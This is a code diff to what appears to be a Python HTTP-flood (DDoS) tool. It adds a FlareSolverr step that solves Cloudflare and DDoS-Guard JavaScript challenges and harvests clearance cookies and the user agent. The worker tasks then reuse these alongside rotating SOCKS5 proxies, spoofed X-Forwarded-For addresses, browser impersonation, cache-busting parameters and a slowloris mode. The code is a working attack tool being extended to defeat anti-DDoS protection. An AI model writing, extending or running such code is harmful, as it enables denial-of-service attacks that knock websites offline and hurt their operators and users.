@@ -6,6 +6,11 @@ import re
 import urllib.request
 import os
 import sys
+import json
+
+# Global variables for FlareSolverr bypass
+global_cf_cookies = {}
+global_cf_ua = None
 
 
 print('''
@@ -660,6 +665,30 @@ async def check_waf(target_url):
 				logging.warning("[WAF DETECT] Qrator detected!")
 			elif "akamai" in server_lower:
 				logging.warning("[WAF DETECT] Akamai detected!")
+				
+			# FlareSolverr CF Bypass Integration
+			if "cloudflare" in server_lower or "ddos-guard" in server_lower or response.status_code in [403, 503]:
+				logging.info("[FLARESOLVERR] Attempting to bypass JS Challenge via FlareSolverr (localhost:8191)...")
+				try:
+					payload = {
+						"cmd": "request.get",
+						"url": target_url,
+						"maxTimeout": 60000
+					}
+					async with AsyncSession() as fs_session:
+						fs_resp = await fs_session.post("http://localhost:8191/v1", json=payload, timeout=65.0)
+						fs_data = fs_resp.json()
+						if fs_data.get("status") == "ok":
+							global global_cf_ua
+							global_cf_ua = fs_data["solution"]["userAgent"]
+							cookies = fs_data["solution"]["cookies"]
+							for c in cookies:
+								global_cf_cookies[c["name"]] = c["value"]
+							logging.info(f"[FLARESOLVERR] Bypass SUCCESS! Extracted clearance cookies: {len(global_cf_cookies)}")
+						else:
+							logging.error("[FLARESOLVERR] Bypass failed or returned error.")
+				except Exception as e:
+					logging.error(f"[FLARESOLVERR] Could not connect to FlareSolverr API at localhost:8191. Make sure it is running! Error: {e}")
 	except Exception as e:
 		logging.debug(f"[WAF DETECT] Could not determine WAF: {e}")
 
@@ -697,8 +726,12 @@ async def WorkerTask(counter, semaphore):
 						proxy_url = f"socks5://{raw_proxy}"
 
 				randomip = f"{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
+				
+				# Use FlareSolverr User-Agent if bypassed, else random
+				ua = global_cf_ua if global_cf_ua else f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.3{random.randint(0, 9)}"
+				
 				extra_headers = {
-					"User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.3{random.randint(0, 9)}",
+					"User-Agent": ua,
 					"X-Forwarded-For": randomip,
 					"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
 					"Accept-Language": "en-US,en;q=0.9,ru;q=0.8",
@@ -717,7 +750,7 @@ async def WorkerTask(counter, semaphore):
 
 				# Open a fresh HTTP/2 Session with a NEW proxy/fingerprint
 				try:
-					async with AsyncSession(impersonate=browser, proxy=proxy_url, verify=False) as session:
+					async with AsyncSession(impersonate=browser, proxy=proxy_url, verify=False, cookies=global_cf_cookies if global_cf_cookies else None) as session:
 						if is_slowloris:
 							target = "http://" + random.choice(ips).strip() if choice1 == "1" else url
 							target_with_buster = f"{target}?_cb={random.randint(100000, 99999999)}"
